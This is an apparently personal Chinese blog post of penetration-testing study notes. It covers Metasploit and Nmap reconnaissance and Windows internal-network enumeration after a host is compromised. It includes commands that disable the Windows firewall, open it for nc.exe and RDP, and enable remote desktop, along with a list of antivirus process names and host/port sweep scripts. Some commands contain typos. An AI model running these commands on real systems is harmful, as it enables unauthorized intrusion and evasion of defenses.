+    <h1 class="posttitle" itemprop="name headline">
+        鮾魍肾透学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Du1L0v3</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-20T05:43:27.000Z" itemprop="datePublished">2021-09-20</time>
+        
+        (Updated: <time datetime="2021-10-31T03:46:32.139Z" itemprop="dateModified">2021-10-31</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%99%BA%E6%85%A7%E7%9A%84%E6%94%B6%E8%97%8F/">智慧的收藏</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E8%82%BE%E9%80%8F/" rel="tag">肾透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>菜鸡笔记</p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><p>PowerShell 在线</p>
+<p><a target="_blank" rel="noopener" href="https://www.pstips.net/powershell-online-tutorials">https://www.pstips.net/powershell-online-tutorials</a></p>
+<h3 id="被动信息搜集"><a href="#被动信息搜集" class="headerlink" title="被动信息搜集"></a>被动信息搜集</h3><h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; whois testfire.net</span><br></pre></td></tr></table></figure>
+
+<h4 id="netcraft"><a href="#netcraft" class="headerlink" title="netcraft"></a>netcraft</h4><p><a target="_blank" rel="noopener" href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a></p>
+<h4 id="nslook"><a href="#nslook" class="headerlink" title="nslook"></a>nslook</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslook</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=mx</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:tetfire.net login</span><br></pre></td></tr></table></figure>
+
+<h3 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -Pn -p1-65536 192.168.160.13</span><br><span class="line">nmap -Pn -sS- A -oX Subnet1.xml 192.168.160.0/24</span><br></pre></td></tr></table></figure>
+
+<h5 id="tcp-空闲扫描"><a href="#tcp-空闲扫描" class="headerlink" title="tcp 空闲扫描"></a>tcp 空闲扫描</h5><p>冒充空闲主机 IP 帧标识</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf &gt; show options </span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threds 50</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; nmap -PN -sI 192.168.160.2 192.168.160.13</span><br></pre></td></tr></table></figure>
+
+<h4 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/postgresql start</span><br><span class="line">msf &gt; db_connect postgres:postgres@127.0.0.1/msf</span><br><span class="line">msf &gt; db_status</span><br><span class="line">msf &gt; db_import /root/test/Subnet1.xml</span><br><span class="line">msf &gt; hosts -c address</span><br></pre></td></tr></table></figure>
+
+<h4 id="结合-postgresql-与-Nmap"><a href="#结合-postgresql-与-Nmap" class="headerlink" title="结合 postgresql 与 Nmap"></a>结合 postgresql 与 Nmap</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; db_nmap -sS -A 192.168.160.13</span><br><span class="line">msf &gt; services -u</span><br></pre></td></tr></table></figure>
+
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>利用 msf 框架提供的端口扫描工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search portscan</span><br><span class="line">msf &gt; use auxiliary/scanner/portscan/syn</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="针对性扫描"><a href="#针对性扫描" class="headerlink" title="针对性扫描"></a>针对性扫描</h3><h4 id="服务器消息块协议扫描"><a href="#服务器消息块协议扫描" class="headerlink" title="服务器消息块协议扫描"></a>服务器消息块协议扫描</h4><p>smb_version 模块可以遍历网络并获取 windows 系统版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.13</span><br><span class="line">msf &gt; run</span><br><span class="line">msf &gt; hosts -u -c address,os_name,svcs,vulns,workspace</span><br></pre></td></tr></table></figure>
+
+<p>快速且安全定位高风险主机的方法</p>
+<h4 id="搜索配置不当的-Microsoft-SQL-Server"><a href="#搜索配置不当的-Microsoft-SQL-Server" class="headerlink" title="搜索配置不当的 Microsoft SQL Server"></a>搜索配置不当的 Microsoft SQL Server</h4><p>MSSQL 默认 1433 端口，使用 mssql_ping（利用 UDP 协议）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>用以在大量主机子网中查找 MSSQL，比 Nmao 逐一端口查找快得多</p>
+<h4 id="SSH-服务器扫描"><a href="#SSH-服务器扫描" class="headerlink" title="SSH 服务器扫描"></a>SSH 服务器扫描</h4><p>ssh_version 模块用以识别目标服务器上运行的 ssh 版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">msf &gt; show option</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>如果期望攻击一个特定版本的 OpenSSH 服务程序，可以先使用 ssh_version 扫描</p>
+<h4 id="FTP-扫描"><a href="#FTP-扫描" class="headerlink" title="FTP 扫描"></a>FTP 扫描</h4><p>ftp_version 模块可以对 FTP 服务器进行扫描识别与查点</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 255</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>scanner/ftp/anomymous 模块可以检查 FTP 服务器是否允许匿名用户登录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/anonymous</span><br><span class="line">msf &gt; show options</span><br><span class="line">msf &gt; set rhosts 192.168.160.0/24</span><br><span class="line">msf &gt; set threads 50</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>如果报告允许匿名登陆且拥有读写权限，就相当于我们对其拥有完全访问权限</p>
+<h4 id="简单网管协议扫描"><a href="#简单网管协议扫描" class="headerlink" title="简单网管协议扫描"></a>简单网管协议扫描</h4><p>可访问的 SNMP（简单网管协议）服务器可以泄露很多信息甚至导致设备被远程攻陷</p>
+<p>msf 框架中包含了一个内置辅助模块 scanner/snmp/snmp_enum，RO 与 RW 权限的团体字符串猜解与获取很重要</p>
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 网络配置</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 操作系统及软件信息</span></span><br><span class="line">systeminfo  # 版本信息</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%  # 体系结构</span><br><span class="line">wmic product get name,version  # 利用 wmic,  参考 https://blog.csdn.net/discover2210212455/article/details/82711930</span><br><span class="line">powershell &quot;&quot; # https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 本机服务信息</span></span><br><span class="line">wmic service list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 进程列表</span></span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. 启动程序信息</span></span><br><span class="line">wmic startup get command,caption</span><br><span class="line"><span class="meta">#</span><span class="bash"> 6. 计划任务</span></span><br><span class="line">schtasks /query /fo LIST /v  # 必须要是 Administrator 执行，不然会报错</span><br><span class="line"><span class="meta">#</span><span class="bash"> 7. 主机开机时间</span></span><br><span class="line">net statistics workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 8. 查询用户列表</span></span><br><span class="line">net user  # 本机用户列表</span><br><span class="line">net localgroup administrators  # 本地管理员信息（通常包含域用户）</span><br><span class="line">query user || qwinsta  # 查看当前在线用户</span><br><span class="line"><span class="meta">#</span><span class="bash"> 9. 列出或断开本地计算机与所连接得客户端之间的会话</span></span><br><span class="line">net session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 10. 查询端口列表</span></span><br><span class="line">netstat -ano</span><br><span class="line"><span class="meta">#</span><span class="bash"> 11. 补丁列表</span></span><br><span class="line">systeminfo</span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 12. 本机共享列表</span></span><br><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"><span class="meta">#</span><span class="bash"> 13. 路由表及所有可用接口的 ARP 缓存表</span></span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> 14. 防火墙相关配置</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) 关闭防火墙</span></span></span><br><span class="line">netsh firewall set opmode disable  # Windows Server 2003 及之前的版本</span><br><span class="line">netsh advfirewall set allprofiles state off  # Windows Server 2003 之后的版本</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) 防火墙配置</span></span></span><br><span class="line">netsh firewall show config</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) 修改防火墙配置</span></span></span><br><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable  # Windows Server 2003 及之前的版本，允许指定程序全部连接</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;  # Windows Server 2003 之后的版本，允许指定程序进入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;  # 同上，允许指定程序退出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow  # 同上，允许 3389 端口放行</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (4) 自定义防火墙日志的储存位置</span></span></span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\shit.log&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 15. 代理配置情况</span></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 16. 查询并开启远程连接服务</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) 查看远程连接端口</span></span></span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber  # 结果为 0xd3d，转换后为 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) 在 Windows Server 2003 中开启 3389 端口</span></span></span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</span></span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName = &#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">req add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<h4 id="常见杀毒软件进程"><a href="#常见杀毒软件进程" class="headerlink" title="常见杀毒软件进程"></a>常见杀毒软件进程</h4><table>
+<thead>
+<tr>
+<th>进程</th>
+<th>软件名称</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>360sd.exe</td>
+<td>360杀毒</td>
+</tr>
+<tr>
+<td>360tray.exe</td>
+<td>360实时保护</td>
+</tr>
+<tr>
+<td>ZhuDongFangYu.exe</td>
+<td>360主动防御</td>
+</tr>
+<tr>
+<td>KSafeTray.exe</td>
+<td>金山卫士</td>
+</tr>
+<tr>
+<td>SafeDogUpdateCenter.exe</td>
+<td>服务器安全狗</td>
+</tr>
+<tr>
+<td>McAfree McShield.exe</td>
+<td>McAfee</td>
+</tr>
+<tr>
+<td>egui.exe</td>
+<td>NOD32</td>
+</tr>
+<tr>
+<td>AVP.EXE</td>
+<td>卡巴斯基</td>
+</tr>
+<tr>
+<td>avguard.exe</td>
+<td>小红伞</td>
+</tr>
+<tr>
+<td>bdagent.exe</td>
+<td>BitDefender</td>
+</tr>
+</tbody></table>
+<h4 id="WMIC-脚本自动收集信息"><a href="#WMIC-脚本自动收集信息" class="headerlink" title="WMIC 脚本自动收集信息"></a>WMIC 脚本自动收集信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; Du1L0v3_WMIC_out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami  # 当前权限</span><br><span class="line">whoami /all  # 获取域 SID</span><br><span class="line">net user XXX /domain  # 指定用户的详细信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">nslookup xxxx.xxxx  # 反向解析查询来判断域控和DNS是否在同一服务器上</span><br><span class="line"><span class="meta">#</span><span class="bash"> 信息</span></span><br><span class="line">systeminfo</span><br><span class="line">net config workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断主域</span></span><br><span class="line">net time /domain</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1. 存在域但当前用户不是域用户，会报错 &quot;系统错误5 拒绝访问&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2. 存在域且当前用户是域用户，则成功完成命令</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3. 当前网络环境为工作组，不存在域，则会报错 &quot;找不到域 WORKGROUP 的域控制器&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>可以分时间段进行探测，以对比存活主机及对应的 IP</p>
+<h4 id="NetBIOS-快速探测内网"><a href="#NetBIOS-快速探测内网" class="headerlink" title="NetBIOS 快速探测内网"></a>NetBIOS 快速探测内网</h4><p>NetBIOS 是局域网程序使用的一种应用程序编程接口</p>
+<p>nbtscan 是一个命令行工具，用于扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器，将其上传到目标主机中，输入 IP 地址范围并运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.0/24</span><br></pre></td></tr></table></figure>
+
+<h5 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h5><table>
+<thead>
+<tr>
+<th>Token</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SHARING</td>
+<td>该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享</td>
+</tr>
+<tr>
+<td>DC</td>
+<td>该机器可能是域控</td>
+</tr>
+<tr>
+<td>U=USER</td>
+<td>该机器中有登录名为 User 的用户（不太准确</td>
+</tr>
+<tr>
+<td>IIS</td>
+<td>该机器中可能安装了 IIS 服务器</td>
+</tr>
+<tr>
+<td>EXCHANGE</td>
+<td>该机器中可能安装了 Exchange</td>
+</tr>
+<tr>
+<td>NORTTES</td>
+<td>该机器中可能安装了 Lotus Notes 电子邮件客户端</td>
+</tr>
+<tr>
+<td>？</td>
+<td>没有识别出该机器的 NetBIOS 资源（可以使用 -F 选项再次扫描</td>
+</tr>
+</tbody></table>
+<h4 id="ICMP-协议快速探测内网"><a href="#ICMP-协议快速探测内网" class="headerlink" title="ICMP 协议快速探测内网"></a>ICMP 协议快速探测内网</h4><p>依次对内网中的每个 IP 执行 ping 命令，可以快速找出内网中所有存活的主机，使用如下命令循环探测整个 C 段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>VBS 脚本</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;192.168.1.&quot;</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span></span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alived :)&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">objTS.Close</span><br><span class="line">WScript.Echo <span class="string">&quot;All Ping Scan, All Done :)&quot;</span></span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer)</span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.statusCode</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">Ping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">Ping = <span class="literal">False</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<p>Shell 脚本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..254&#125;;do</span><br><span class="line">&#123;</span><br><span class="line">ping -c1 -W1 10.10.1.$i &amp;&amp; echo &quot;10.10.1.$i&quot; is alive;</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>
+
+<h4 id="ARP-扫描探测内网"><a href="#ARP-扫描探测内网" class="headerlink" title="ARP 扫描探测内网"></a>ARP 扫描探测内网</h4><ul>
+<li>arp-scan</li>
+<li>Empire 的 arpscan 模块</li>
+<li>Nishang 的 Invoke-ARPScan.ps1 脚本</li>
+</ul>
+<h4 id="常规-TCP-UDP-端口扫描探测内网"><a href="#常规-TCP-UDP-端口扫描探测内网" class="headerlink" title="常规 TCP/UDP 端口扫描探测内网"></a>常规 TCP/UDP 端口扫描探测内网</h4><p>ScanLine</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure>
+
+<h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><ul>
+<li>telnet</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 22</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>S 扫描器</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>PowerSploit 的 Invoke-portscan.ps1 脚本</li>
+<li>Nishang 的 Invoke-PortScan.ps1 脚本</li>
+</ul>
+<h4 id="端口-Banner-信息"><a href="#端口-Banner-信息" class="headerlink" title="端口 Banner 信息"></a>端口 Banner 信息</h4><ul>
+<li><code>安全焦点</code>：<a target="_blank" rel="noopener" href="http://www.securityfocus.com/bid">http://www.securityfocus.com/bid</a></li>
+<li><code>Exploit-DB</code>：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)</a></li>
+</ul>
+<h5 id="常见端口及说明"><a href="#常见端口及说明" class="headerlink" title="常见端口及说明"></a>常见端口及说明</h5><ul>
+<li>文件共享服务端口</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>21、22、69</td>
+<td>FTP/TFTP 文件传输协议</td>
